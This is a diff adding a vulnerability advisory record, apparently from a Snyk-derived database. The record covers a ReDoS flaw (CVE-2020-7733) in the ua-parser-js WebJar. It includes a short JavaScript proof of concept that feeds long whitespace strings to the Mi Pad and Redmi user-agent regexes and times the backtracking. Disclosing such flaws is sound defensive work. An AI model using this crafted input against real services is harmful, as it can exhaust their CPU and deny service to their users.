@@ -136,3 +136,37 @@
   - https://github.com/faisalman/ua-parser-js/issues/298
   - https://github.com/faisalman/ua-parser-js/pull/299
   source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-480286
+- id: snykio:maven:org.webjars.npm:ua-parser-js:674665
+  title: Regular Expression Denial of Service (ReDoS)
+  description: "[org.webjars.npm:ua-parser-js][1] is a WebJar for ua-parser-js\n\nAffected
+    versions of this package are vulnerable to Regular Expression\nDenial of Service
+    (ReDoS) via the regex for Redmi Phones and Mi Pad\nTablets UA.\n\n### POC by Yeting
+    Li   {#poc-by-yeting-li}\n\n    var blank = \" \";\n    for (let i = 1; i < 5000;
+    i++) {\n    blank = blank + \" \";\n    }\n    \n    str_mi = \"android1mipad\"
+    + blank + \"!\";\n    str_mi = str_mi + +blank + \"!\";\n    mi = /android.+(mi[s-_]*(?:pad)(?:[s_]*[ws]+))s+build/i;\n
+    \   \n    var count_mi = 0;\n    for (let i = 0; i < 10; i++) {\n    var time
+    = Date.now();\n    mi.test(str_mi);\n    var len = Date.now() - time;\n    count_mi
+    = count_mi + len;\n    console.log(\"mi:\" + blank.length + \": \" + len)\n    }\n
+    \   console.log(count_mi / 10);\n    \n    str_redmi = \"android1redminote\" +
+    blank + \"!\";\n    redmi = /android.+(redmi[s-_]*(?:note)?(?:[s_]*[ws]+))s+build/i;\n
+    \   var count_redmi = 0;\n    for (let i = 0; i < 10; i++) {\n    var time = Date.now();\n
+    \   redmi.test(str_redmi);\n    var len = Date.now() - time;\n    count_redmi
+    = count_redmi + len;\n    console.log(\"redmi:\" + blank.length + \": \" + len)\n
+    \   }\n    console.log(count_redmi / 10);\n\n\n\n[1]: https://github.com/faisalman/ua-parser-js.git\n"
+  affected_package: org.webjars.npm:ua-parser-js
+  vulnerable_versions:
+  - ">= 0"
+  severity: high
+  package_manager: maven
+  cve:
+  - CVE-2020-7733
+  cwe:
+  - CWE-400
+  disclosed_date: 2020-09-09
+  created_date: 2020-09-16
+  last_modified_date: 2020-09-16
+  credit:
+  - Yeting Li
+  references:
+  - https://github.com/faisalman/ua-parser-js/commit/233d3bae22a795153a7e6638887ce159c63e557d
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-674665
